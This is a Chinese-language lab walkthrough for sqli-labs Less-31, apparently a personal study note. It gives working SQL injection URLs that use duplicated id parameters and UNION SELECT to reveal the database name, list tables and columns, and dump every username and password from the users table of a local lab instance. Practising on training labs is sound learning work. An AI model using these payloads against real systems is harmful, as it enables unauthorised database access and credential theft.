---
title: Less - 31
date: 2023-03-16T23:32:31Z
lastmod: 2023-03-17T12:09:14Z
---

# Less - 31

---

# 通关教程

---

## 1、判断闭合

---

```http
http://192.168.225.132/sqli-labs/Less-31/login.php?id=1&id=2'
http://192.168.225.132/sqli-labs/Less-31/login.php?id=1&id=2"
```

​![image](assets/image-20230317120137-x95z0bb.png)​

​![image](assets/image-20230317120201-da7juxq.png)​根据错误信息判断闭合方式为")–+，并且为字符型注入

---

## 2、查看当前库

---

```http
http://192.168.225.132/sqli-labs/Less-31/login.php?id=1&id=0") union select 1,2,database()--+
```

​![image](assets/image-20230317120351-royhr3j.png)​

---

## 3、查看security库下的所有表

---

```http
http://192.168.225.132/sqli-labs/Less-31/login.php?id=1&id=0") union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema='security')--+
```

​![image](assets/image-20230317120653-kuhgnmt.png)​

---

## 4、查看users表下的所有字段

---

```http
http://192.168.225.132/sqli-labs/Less-31/login.php?id=1&id=0") union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name='users')--+
```

​![image](assets/image-20230317120741-nqoas0k.png)​

---

## 5、查看username,password字段的所有值

---

```http
http://192.168.225.132/sqli-labs/Less-31/login.php?id=1&id=0") union select 1,2,(select group_concat(concat_ws('~',username,password)) from security.users)--+
```

​![image](assets/image-20230317120903-27mg3qd.png)​

‍
